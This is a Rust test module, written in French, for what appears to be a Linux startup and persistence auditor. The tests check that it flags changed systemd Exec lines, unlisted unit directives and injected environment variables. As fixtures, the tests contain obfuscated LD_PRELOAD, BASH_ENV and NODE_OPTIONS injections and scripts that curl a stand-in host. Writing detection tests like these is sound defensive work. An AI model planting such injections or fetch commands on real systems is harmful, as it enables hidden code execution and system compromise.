    /// signalée ; le programme d'un ExecStartPre= changé après le choix fait revenir l'alerte.
    #[test]
    fn autres_lignes_exec_liees() {
        let m = Maison::nouvelle("exec-liees");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nType=oneshot\nExecStartPre=/opt/outil/avant\nExecStart=%h/.cache-x/rappel.sh\nExecStopPost=/opt/outil/apres --fin\n",
        );
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let opt = m.racine.join("opt/outil");
        std::fs::create_dir_all(&opt).unwrap();
        std::fs::write(opt.join("avant"), "#!/bin/sh\necho avant\n").unwrap();
        std::fs::write(opt.join("apres"), "#!/bin/sh\necho apres\n").unwrap();
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            declare.message
        );
        let t = declare.temoins();
        let chemins: Vec<String> = t
            .lignes()
            .iter()
            .flat_map(|l| l.cibles.iter().map(|c| c.chemin.clone()))
            .collect();
        for attendu in ["ExecStartPre=/opt/outil/avant → /opt/outil/avant", "ExecStopPost="] {
            assert!(
                chemins.iter().any(|c| c.starts_with(attendu)),
                "{attendu} : {chemins:?}"
            );
        }
        assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()));
        std::fs::write(opt.join("avant"), "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
        // Une ligne Exec d'un ajout, aussi.
        let m = maison_avec_rappel("exec-ajout");
        std::fs::create_dir_all(m.racine.join("opt")).unwrap();
        std::fs::write(m.racine.join("opt/etape"), "#!/bin/sh\necho etape\n").unwrap();
        m.ecrire(
            ".config/systemd/user/rappel.service.d/x.conf",
            "[Service]\nExecStartPost=/opt/etape\n",
        );
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        std::fs::write(m.racine.join("opt/etape"), "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
    }

    /// Deuxième vérification de la campagne E, P2 : une unité ne se déclare normale que si chaque directive est de
    /// la courte liste permise ; tout le reste (espaces de noms, accréditations, PAM, unités lancées en cas d'échec,
    /// remise à zéro d'ExecStart=, dépendance vers un service, valeur qui est un chemin) est refusé.
    #[test]
    fn directives_hors_liste_refusees() {
        for (i, (texte, attendu)) in [
            ("[Service]\nPrivateTmp=yes\n", "PrivateTmp="),
            ("[Unit]\nJoinsNamespaceOf=autre.service\n", "JoinsNamespaceOf="),
            ("[Service]\nLoadCredential=cle:/tmp/c\n", "LoadCredential="),
            (
                "[Service]\nLoadCredentialEncrypted=cle:/tmp/c\n",
                "LoadCredentialEncrypted=",
            ),
            ("[Service]\nPAMName=login\n", "PAMName="),
            ("[Unit]\nOnFailure=autre.service\n", "OnFailure="),
            ("[Unit]\nOnSuccess=autre.service\n", "OnSuccess="),
            ("[Service]\nUnsetEnvironment=PATH\n", "UnsetEnvironment="),
            ("[Service]\nExecStart=\n", "ExecStart= ("),
            ("[Unit]\nWants=autre.service\n", "Wants=autre.service"),
            ("[Install]\nWantedBy=autre.service\n", "WantedBy=autre.service"),
            ("[Service]\nEnvironment=LC_ALL=/tmp/l\n", "Environment=LC_ALL"),
            ("[Service]\nEnvironment=TZ=../../tmp/z\n", "Environment=TZ"),
            ("[Socket]\nListenStream=4444\n", "[Socket]"),
            ("[Service]\nBindPaths=/tmp:/opt\n", "BindPaths="),
            ("[Service]\nsans égal\n", "sans égal"),
        ]
        .into_iter()
        .enumerate()
        {
            assert!(
                directive_refusee(texte)
                    .as_deref()
                    .is_some_and(|v| v.starts_with(attendu)),
                "{texte:?} : {:?}",
                directive_refusee(texte)
            );
            let m = maison_avec_rappel(&format!("hors-liste-{i}"));
            let declare = m.lancements();
            m.ecrire(".config/systemd/user/rappel.service.d/x.conf", texte);
            let plus_tard = m.lancements();
            assert!(crate::apprentissage::declarable(&plus_tard).is_err(), "{texte:?}");
            assert!(
                refus(&plus_tard).contains("courte liste"),
                "{texte:?} : {}",
                refus(&plus_tard)
            );
            assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard), "{texte:?}");
        }
        for texte in [
            "[Unit]\nDescription=Rappel\nAfter=graphical-session.target\nWants=reseau.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=5\nEnvironment=LANG=fr_CA.UTF-8 TZ=America/Montreal\n\n[Install]\nWantedBy=default.target\n",
            "# rien\n",
        ] {
            assert!(
                directive_refusee(texte).is_none(),
                "{texte:?} : {:?}",
                directive_refusee(texte)
            );
        }
    }

    /// Deuxième vérification de la campagne E, P1 : un fichier des variables qui pose une variable d'injection, même
    /// échappée ou coupée par des guillemets, avant le choix comme après : rien ne se déclare, et le refus nomme le
    /// fichier et la ligne.
    #[test]
    fn variable_d_injection_refusee() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".config/environment.d/50-x.conf",
                "LANG=C\nBASH_ENV=/home/alice/.e\n",
                "~/.config/environment.d/50-x.conf:2",
            ),
            (
                ".config/environment.d/50-x.conf",
                "\\x4cD_PRELOAD=/tmp/l.so\n",
                "~/.config/environment.d/50-x.conf:1",
            ),
            (".profile", "export \"LD_\"'PRELOAD'=/tmp/l.so\n", "~/.profile:1"),
            (".bashrc", "export $'\\x4c'D_PRELOAD=/tmp/l.so\n", "~/.bashrc:1"),
            (".zshenv", "NODE_OPTIONS=--require=/tmp/x.js\n", "~/.zshenv:1"),
            (".bashrc", "unset SHELLOPTS\n", "~/.bashrc:1"),
            (
                ".config/hypr/hyprland.conf",
                "env = GTK_MODULES,x\n",
                "~/.config/hypr/hyprland.conf:1",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("injection-{i}"));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok());
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
            assert!(refus(&c).contains(attendu), "{texte:?} : {}", refus(&c));
            assert!(!crate::apprentissage::essai_tait(&declare, &c), "{texte:?}");
        }
        // Dans un fichier lu par « . » (non jugé ligne à ligne) : « ${NOM:=…} » la pose ; une lecture, non.
        let m = maison_avec_rappel("injection-source");
        m.ecrire(".bashrc", "[ -r ~/.autres/p.sh ] && . ~/.autres/p.sh\n");
        m.ecrire(
            ".autres/p.sh",
            "local o=$SHELLOPTS:$BASHOPTS\n[ -n \"${LD_PRELOAD}${#PYTHONPATH}\" ]\n",
        );
        assert!(
            crate::apprentissage::declarable(&m.lancements()).is_ok(),
            "{}",
            refus(&m.lancements())
        );
        m.ecrire(".autres/p.sh", ": ${LD_PRELOAD:=/tmp/l.so}\n");
        assert!(
            refus(&m.lancements()).contains("~/.autres/p.sh:1"),
            "{}",
            refus(&m.lancements())
        );
        // Un commentaire qui la nomme ne pose rien.
        let m = maison_avec_rappel("injection-commentaire");
        m.ecrire(".profile", "# export LD_PRELOAD=/tmp/l.so\nexport LANG=C\n");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
    }

    /// Deuxième vérification de la campagne E : le détail des variables se lit en quelques lignes (une par sorte de
    /// chose liée), et les lignes qui posent une variable hors de la liste sûre se montrent en clair.
    #[test]
    fn detail_des_variables_lisible() {
        let m = maison_avec_rappel("detail-variables");
        m.ecrire(
            ".profile",
            "export LANG=fr_CA.UTF-8\nexport PATH=\"$HOME/bin:$PATH\"\n. ./voisin.sh\n",
        );
        m.ecrire(".config/environment.d/10-a.conf", "EDITOR=nvim\n");
        let c = m.lancements();
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
        let apercu = apercu_de_l_environnement(&c);
        assert!(apercu.len() <= 6, "{apercu:?}");
        assert!(
            apercu[0].starts_with("2 fichiers de variables liés en entier"),
            "{apercu:?}"
        );
        assert!(
            apercu
                .iter()
                .any(|l| l.contains("non suivis") && l.contains("~/.profile:3")),
            "{apercu:?}"
        );
        assert!(
            apercu.iter().any(|l| l.contains("~/.profile:2") && l.contains("PATH")),
            "{apercu:?}"
        );
        assert!(
            apercu.iter().any(|l| l.contains("10-a.conf:1") && l.contains("EDITOR")),
            "{apercu:?}"
        );
        assert!(!apercu.iter().any(|l| l.contains("LANG")), "{apercu:?}");
    }

    /// Deuxième vérification de la campagne E, 2.4 et 2.5 : un « source = » de Hyprland se suit à tous les niveaux,
    /// même hors de ~/.config/hypr, et par un joker ; un profil lit aussi par « [ -f x ] && . x » et « if … fi ».
    #[test]
    fn sources_suivies_a_tous_les_niveaux() {
        let m = maison_avec_rappel("hypr-niveaux");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/a.conf\n");
        m.ecrire(".autres/a.conf", "source = ~/.loin/b.conf\n");
        m.ecrire(".loin/b.conf", "# rien\n");
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        m.ecrire(".loin/b.conf", "env = EDITOR,nvim\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
        m.ecrire(".loin/b.conf", "env = LD_PRELOAD,/tmp/l.so\n");
        assert!(refus(&m.lancements()).contains("~/.loin/b.conf:1"));

        let m = maison_avec_rappel("hypr-joker");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/*.conf\n");
        m.ecrire(".autres/v.conf", "# rien\n");
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        m.ecrire(".autres/v.conf", "# autre chose\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));

        for (i, (fichier, texte)) in [
            (".bashrc", "[ -f ~/.autres/p.sh ] && . ~/.autres/p.sh\n"),
            (
                ".profile",
                "if [ -r \"$HOME/.autres/p.sh\" ]; then\n  . \"$HOME/.autres/p.sh\"\nfi\n",
            ),
            (
                ".zshrc",
                "[[ -f ${HOME}/.autres/p.sh ]] && source ${HOME}/.autres/p.sh\n",
            ),
            (".bashrc", "if [ -f ~/.autres/p.sh ]; then . ~/.autres/p.sh; fi\n"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("shell-formes-{i}"));
            m.ecrire(fichier, texte);
            m.ecrire(".autres/p.sh", "# rien\n");
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok(), "{texte}");
            m.ecrire(".autres/p.sh", "export EDITOR=vi\n");
            assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
        }
    }

    /// Deuxième vérification de la campagne E : ZDOTDIR, ~/.xsessionrc et ~/.bash_logout se lisent aussi.
    #[test]
    fn autres_profils_lus() {
        for (i, fichier) in [".xsessionrc", ".bash_logout", ".zlogout"].into_iter().enumerate() {
            let m = maison_avec_rappel(&format!("autres-profils-{i}"));
            m.ecrire(fichier, "export LD_PRELOAD=/tmp/l.so\n");
            assert!(refus(&m.lancements()).contains(fichier), "{fichier}");
        }
        let m = maison_avec_rappel("zdotdir");
        let zdot = m.chemin(".config/zsh");
        m.ecrire(".config/zsh/.zshenv", "export BASH_ENV=/tmp/x\n");
        let c = persistance_dans(
            &m.racine,
            &m.racine.join("home/alice"),
            |v| match v {
                "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
                "ZDOTDIR" => Some(zdot.clone().into_os_string()),
                _ => None,
            },
            None,
            None,
        )
        .into_iter()
        .next()
        .unwrap();
        assert!(refus(&c).contains(".config/zsh/.zshenv:1"), "{}", refus(&c));
    }

    /// Deuxième vérification de la campagne E : un dossier personnel absent, ou un dossier de démarrages du compte
    /// illisible, est « non vérifié », jamais « rien de suspect ».
    #[cfg(unix)]
    #[test]
    fn dossiers_du_compte_illisibles_dits() {
        use std::os::unix::fs::PermissionsExt as _;
        let m = Maison::nouvelle("maison-absente");
        let c = persistance_dans(&m.racine, &m.racine.join("home/personne"), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(c.message.contains("dossier personnel ne se lit pas"), "{}", c.message);
        let m = maison_avec_rappel("config-illisible");
        let dossier = m.chemin(".config/autostart");
        std::fs::create_dir_all(&dossier).unwrap();
        std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o000)).unwrap();
        if std::fs::read_dir(&dossier).is_ok() {
            std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o755)).unwrap();
            return crate::essais::saute("le compte lit un dossier sans droit de lecture (root)");
        }
        let c = m.lancements();
        std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(c.message.contains("~/.config/autostart ne se lit pas"), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// Une ligne de cron se lit sans son horaire ni le compte qui la lance.
    #[test]
    fn commandes_de_cron() {
        assert_eq!(commande_de_cron("*/5 * * * * /opt/a --b", false), "/opt/a --b");
        assert_eq!(commande_de_cron("@reboot /opt/a", false), "/opt/a");
        assert_eq!(commande_de_cron("0 3 * * * root /opt/a", true), "/opt/a");
        assert_eq!(commande_de_cron("@daily root /opt/a", true), "/opt/a");
    }
}
